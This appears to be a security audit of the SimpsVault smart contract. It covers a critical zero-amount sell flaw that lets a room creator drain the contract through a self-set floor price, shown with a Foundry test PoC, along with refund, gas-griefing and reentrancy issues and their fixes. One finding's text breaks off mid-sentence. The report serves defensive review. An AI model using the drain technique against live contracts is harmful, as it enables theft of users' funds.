# SimpSocial Audit

**Repo:** https://github.com/simpssocial/SimpsVault/tree/master

**Commit:** [2b51fae011a8287bb8e6c1673684064bbb3e8989](https://github.com/simpssocial/SimpsVault/blob/2b51fae011a8287bb8e6c1673684064bbb3e8989)

**Findings:** 1 CRITICAL, 1 MEDIUM, 4 LOW, 2 GAS OPTIMIZATIONS, 3 INFORMATIONAL

## [CRITICAL-01] it is possible to sell nothing for everything

The `sellShares` function does not check if `amount` is greater than zero, leading to attacker being able to steal the entire balance of the contract.

The formula for the quadratic curve is:

```solidity
return summation * 1 ether / steepness + floor;
```

where summation is the quadratic supply delta and `floor` is initialized by creator of the room.
when selling `amount = 0` then `summation = 0`, leading to return `floor` from `getPriceLinear` and `getPriceQuadratic`.
since `floor` is controlled by the room creator, an attacker can create a room with `floor = address(simps).balance` and sell 0 shares, resulting in sell price of the entire balance.

**PoC:**

```solidity
/// @dev Test selling zero amount of shares does not transfer any funds since quadratic curve results in floor price
function test_SellZeroQuadratic() public {
    vm.startPrank(simp1);

    // ensure contract has funds
    vm.deal(address(simps), 100 ether);

    // steal `floor` amount of funds
    uint256 floor = address(simps).balance;
    uint256 room = simps.createRoom(SimpsVault.Curves.Quadratic, 16000, floor, 0, 0);

    uint256 balanceBefore = address(simp1).balance;
    simps.sellShares(simp1, 0, 0);
    uint256 balanceAfter = address(simp1).balance;
    assertEq(balanceAfter - balanceBefore, 0);

    vm.stopPrank();
}
```

**Recommendation:**

add `require(amount > 0)` in `sellShares` and/or in `getPriceLinear`, `getPriceQuadratic`.

perhaps consider removing floor price altogether.


## [MEDIUM-01] excess ether transferred cannot be recovered

If someone overpays for shares they are not refunded. Considering these funds are locked forever I consider this to have medium impact.

**Recommendation:**

Refund excess funds.


## [LOW-01] You get 1 free share when creating a room

If someone buys at least 1 extra share after someone creates a room:

1. the room creator can sell their free share for that current market price.
2. that last share cannot be sold.

**Recommendation:**

Either charge the floor price when creating a room, prevent owner from selling their last share, or simply set `totalSupply = 1` without attributing that share to anyone.


## [LOW-02] attackers can exhaust traders gas

Since `sharesSubject` is controlled by room creators, an attacker can create a contract if contracts are allowed to call `createRoom`, this call could consume arbitrary gas from users.

**Recommendation:**

`require(msg.sender == tx.origin)`

or:

`require(!isContract(msg.sender))`


## [LOW-03] There is o limit on setting fees

Admin can accidentaly set bad values.

**Recommendation:**

Check fee values are within reasonable range.


### [LOW-04] Sigmoid curve has quadratic complexity

The sigmoid curve is implemented via a for-loop that calculates the price for each share bought. The for-loop body contains a sqrt calculation which itself also contains a loop, making the calculation quadratic.

This is making it increasingly difficult and expensive to buy shares as amount grows and makes price 


### [GAS-OPT-01] No need to check sharesSubject against zero address

In `buyShares`, since this check exists:

```solidity
require(rooms[sharesSubject][roomNumber].sharesSupply > 0, "Invalid room");
```

and only `msg.sender` can create rooms, then it is guaranteed `sharesSubject` is not `address(0)`


### [GAS-OPT-02] createRoom can be optimized

All curve parameters are passed when creating a room, even though not all of them are used.

As such `Room` struct does not require `midPoint`, `maxPrice` for all curves, as well as floor and even steepness


## [INFORMATIONAL-01] reentrancy possible in buyShares & sellShares

Since `sharesSubject` is controlled by room creators, they can lead to reentrancy.

**Recommendation:***

Implement recommendations of finding [LOW-02].

## [INFORMATIONAL-02] SimpsToken.sol does not exist

this file is referenced in `test/Token.t.sol` but does not exist in git.


## [INFORMATIONAL-03] getPriceOriginal is subset of getPriceQuadratic

this function can be removed as it is simply quadratic curve with `steepness = 16000` and `floor = 0`

